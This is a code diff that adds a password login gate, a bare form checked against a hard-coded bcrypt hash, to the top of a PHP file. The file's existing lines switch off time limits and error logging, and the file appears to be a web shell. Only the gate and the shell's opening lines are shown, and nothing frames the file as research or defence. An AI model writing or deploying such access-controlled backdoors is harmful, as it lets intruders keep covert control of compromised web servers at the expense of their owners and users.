@@ -1,4 +1,68 @@
 <?php
+session_start();
+
+function show_login_page($message = "")
+{
+?>
+    <!DOCTYPE html>
+    <html>
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: monospace;
+            }
+
+            input[type="password"] {
+                border: none;
+                border-bottom: 1px solid black;
+                padding: 2px;
+            }
+
+            input[type="password"]:focus {
+                outline: none;
+            }
+
+            input[type="submit"] {
+                border: none;
+                padding: 4.5px 20px;
+                background-color: #2e313d;
+                color: #FFF;
+            }
+        </style>
+    </head>
+
+    <body>
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
+            </div>
+        </form>
+    </body>
+
+    </html>
+
+    </html>
+<?php
+    exit;
+}
+
+if (!isset($_SESSION['authenticated'])) {
+    $stored_hashed_password = '$2y$10$JnBvvtBny4trm/kY40xqHeYyGsvO1j9RonD6C7.jnkJdcHY5GSw/.'; 
+
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        show_login_page();
+    }
+}
+?>
+<?php
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
